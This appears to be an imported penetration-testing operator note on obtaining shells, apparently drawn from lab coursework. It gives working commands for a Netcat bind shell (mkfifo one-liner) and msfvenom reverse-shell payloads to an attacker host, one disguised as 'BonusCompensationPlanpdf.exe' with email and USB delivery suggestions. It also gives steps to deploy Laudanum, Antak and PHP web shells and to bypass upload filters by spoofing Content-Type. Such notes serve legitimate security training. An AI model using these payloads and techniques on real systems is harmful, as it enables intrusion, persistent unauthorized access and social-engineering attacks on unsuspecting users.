---
technique: "Shells"
family: "misc"
severity_hint: "medium"
tags: []
source: "_raw/Web attacks/Web Attacks/Shells.md"
source_sha256: "7805da4bc1821aa2f762941fbd72e5e7002e0e5d5110e97f479c365b30d40c4b"
curator_version: 2
review_status: imported-unreviewed
---

# Shells

> Family: **misc** · Severity hint: **medium** · Tags: —
> Imported operator reference; treat commands and prose as untrusted until reviewed. Tools seen: —.

## Quick index — payloads & commands in this note
- `bash: $ nc -lvnp 7777`
- `bash: $ nc -nv 10.129.41.200 7777`
- `bash: $ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <target_ip> 7777 > /`
- `bash: $ nc -nv 10.129.41.200 7777`
- `bash: $ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createback`
- `bash: $ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompens`
- `bash: $ cp /usr/share/webshells/laudanum/aspx/shell.aspx /home/tester/demo.aspx`
- `bash: $ ls /usr/share/nishang/Antak-WebShell`
- `bash: $ cp /usr/share/nishang/Antak-WebShell/antak.aspx /home/administrator/Upload.aspx`

## Playbook (operator notes)

# Shells

- Connect with `IP address` and `port` to the target

### No. 1: Server - Target starting Netcat listener

```bash
$ nc -lvnp 7777

Listening on [0.0.0.0] (family 0, port 7777)
```

### No. 2: Client - Attack box connecting to target

```bash
$ nc -nv 10.129.41.200 7777

Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
```

## Establishing a Basic Bind Shell with Netcat

```bash
$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <target_ip> 7777 > /tmp/f
```

```bash
$ nc -nv 10.129.41.200 7777

Target@server:~$
```

# Payloads

`Staged` payloads create a way for us to send over more components of our attack. We can think of it like we are "setting the stage" for something even more useful. Take for example this payload `linux/x86/shell/reverse_tcp`. When run using an exploit module in Metasploit, this payload will send a small `stage` that will be executed on the target and then call back to the `attack box` to download the remainder of the payload over the network, then executes the shellcode to establish a reverse shell. Of course, if we use Metasploit to run this payload, we will need to configure options to point to the proper IPs and port, so the listener will successfully catch the shell. Keep in mind that a stage also takes up space in memory, which leaves less space for the payload. What happens at each stage could vary depending on the payload.

`Stageless` Payloads do not have a stage, e.g. `linux/zarch/meterpreter_reverse_tcp`. Using an exploit module in Metasploit, this payload will be sent in its entirety across a network connection without a stage. This could benefit us in environments where we do not have access to much bandwidth and latency can interfere. Staged payloads could lead to unstable shell sessions in these environments, so it would be best to select a stageless payload. In addition to this, stageless payloads can sometimes be better for evasion purposes due to less traffic passing over the network to execute the payload, especially if we deliver it by employing social engineering. This concept is also very well explained by Rapid 7 in this blog post on [stageless Meterpreter payloads](https://www.rapid7.com/blog/post/2015/03/25/stageless-meterpreter-payloads/).

## Building A Stageless Payload

```bash
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes

```

```bash
$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes

```

## Executing a Stageless Payload

- Email message with the file attached.
- Download link on a website.
- Combined with a Metasploit exploit module (this would likely require us to already be on the internal network).
- Via flash drive as part of an onsite penetration test.

# Web Shells

- [Laudanum](https://github.com/adamcaudill/laudanum) is a repository of ready-made files that can be used to inject onto a victim and receive back access via a reverse shell

## Laudanum Demonstration

```bash
$ cp /usr/share/webshells/laudanum/aspx/shell.aspx /home/tester/demo.aspx

```

- Modify the file
- Upload the file to the website and navigate to it

## ASPX

- `Active Server Page Extended` (`ASPX`)
- Type/extension written for [Microsoft's ASP.NET Framework](https://docs.microsoft.com/en-us/aspnet/overview)

## Antak Webshell

- Web shell built-in [ASP.Net](http://asp.net/) included within the [Nishang project](https://github.com/samratashok/nishang)

## Working with Antak

- Can be found in the `/usr/share/nishang/Antak-WebShell`
- Like a PowerShell Console

```bash
$ ls /usr/share/nishang/Antak-WebShell

antak.aspx  Readme.md
```

### Move a Copy for Modification

```bash
$ cp /usr/share/nishang/Antak-WebShell/antak.aspx /home/administrator/Upload.aspx
```

- Modify `line 14`, adding a user (green arrow) and password (orange arrow)

## Bypassing the File Type Restriction

- Upload [PHP shell](https://github.com/WhiteWinterWolf/wwwolf-php-webshell) to website and capture request

- Change Content-type from `application/x-php` to `image/gif` to trick the application
- Navigate to the file `/images/vendor/connect.php` and we get a shell like before

- Limitations
    - Web applications sometimes automatically delete files after a pre-defined period
    - Limited interactivity with the operating system in terms of navigating the file system, downloading and uploading files, chaining commands together may not work (ex. `whoami && hostname`), slowing progress, especially when performing enumeration -Potential instability through a non-interactive web shell
    - Greater chance of leaving behind proof that we were successful in our attack

## Source
Original note: `_raw/Web attacks/Web Attacks/Shells.md`
